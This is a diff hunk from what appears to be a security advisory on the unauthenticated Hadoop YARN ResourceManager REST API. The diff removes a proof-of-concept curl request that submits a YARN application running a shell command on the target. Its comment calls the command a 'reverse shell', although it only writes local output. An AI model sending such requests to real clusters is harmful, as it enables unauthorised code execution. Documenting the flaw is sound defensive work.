@@ -20,13 +20,6 @@ or authorisation on this endpoint. Any unauthenticated client can:
 
 This misconfiguration has been exploited at scale to deploy cryptominers.
 
-```bash
-# PoC: submit a reverse shell as a YARN application
-curl -s -X POST http://<host>:8088/ws/v1/cluster/apps \
-  -H 'Content-Type: application/json' \
-  -d '{"application-name":"pwn","am-container-spec":{"commands":{"command":"id > /tmp/pwned"}},"application-type":"YARN"}'
-```
-
 ## Affected Service
 - **Service:** Hadoop YARN ResourceManager
 - **Port:** 8088/TCP (REST API)
